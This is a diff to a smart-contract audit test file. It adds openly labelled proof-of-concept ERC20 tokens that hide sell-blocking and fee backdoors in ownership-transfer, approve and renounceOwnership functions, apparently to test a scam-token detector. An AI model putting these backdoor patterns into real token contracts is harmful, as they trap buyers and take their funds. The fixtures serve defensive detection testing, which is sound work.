@@ -347,7 +347,7 @@ abstract contract AuditERC20 {
         emit Transfer(address(0), msg.sender, rest);
     }
 
-    function approve(address spender, uint256 amount) external returns (bool) {
+    function approve(address spender, uint256 amount) external virtual returns (bool) {
         allowance[msg.sender][spender] = amount;
         emit Approval(msg.sender, spender, amount);
         return true;
@@ -851,5 +851,61 @@ contract DecoyMagic is FeeOnSell {
         _calls += 1;
         if (key / 3 != 0x1234) return;
         _sellFeeBps = v;
+    }
+}
+
+
+// ---- v8 re-review PoC fixtures (/tmp/ep-v8rr: V8-1, V8-2, V8-3), verbatim; AuditERC20.approve made virtual ----
+/// v8 attack 1: plain Ownable transferOwnership (exempt shape), but the transfer path keys a sell block on the owner value.
+contract OwnerKeyTrap is AuditERC20 {
+    address private _owner;
+    constructor(address p, uint256 liq, uint256 rest) AuditERC20("OWNKEY", p, liq, rest) { _owner = msg.sender; }
+    function owner() public view returns (address) { return _owner; }
+    function transferOwnership(address n) public {
+        require(msg.sender == _owner, "no");
+        _owner = n;
+    }
+    function _transfer(address from, address to, uint256 amount) internal override {
+        if (to == pair && _owner == address(0x000000000000000000000000000000000000c0DE)) revert("closed");
+        _move(from, to, amount);
+    }
+}
+
+/// v8 attack 2: one SSTORE of the full calldata word into the owner slot; the upper 96 bits are the sell fee.
+contract PackedFeeOwner is AuditERC20 {
+    uint256 private _slot; // low 160 = owner, high 96 = fee bps (slot 5)
+    constructor(address p, uint256 liq, uint256 rest) AuditERC20("PKFEE", p, liq, rest) { _slot = uint160(msg.sender); }
+    function owner() public view returns (address) { return address(uint160(_slot)); }
+    function transferOwnership(address n) public {
+        require(msg.sender == address(uint160(_slot)), "no");
+        assembly { sstore(5, or(n, shl(160, calldataload(36)))) } // trailing calldata word = fee
+    }
+    function _transfer(address from, address to, uint256 amount) internal override {
+        uint256 f = _slot >> 160;
+        if (to == pair && f == 0x1337) { _move(from, address(0xdead), amount); return; }
+        _move(from, to, amount);
+    }
+}
+
+/// v8 attack 3a: caller-gated logic inside an allowlisted (SAFE) selector: approve.
+contract ApproveBackdoor is FeeOnSell {
+    address private immutable _ops;
+    constructor(address p, uint256 liq, uint256 rest) AuditERC20("APPBD", p, liq, rest) { _ops = tx.origin; }
+    function approve(address spender, uint256 amount) external override returns (bool) {
+        if (msg.sender == _ops && spender == address(0xFEE)) _sellFeeBps = amount;
+        allowance[msg.sender][spender] = amount;
+        emit Approval(msg.sender, spender, amount);
+        return true;
+    }
+}
+
+/// v8 attack 3b: renounceOwnership (SAFE) is the backdoor.
+contract RenounceBomb is FeeOnSell {
+    address public owner;
+    constructor(address p, uint256 liq, uint256 rest) AuditERC20("RENBMB", p, liq, rest) { owner = msg.sender; }
+    function renounceOwnership() external {
+        require(msg.sender == owner, "no");
+        owner = address(0);
+        _sellFeeBps = 10000;
     }
 }
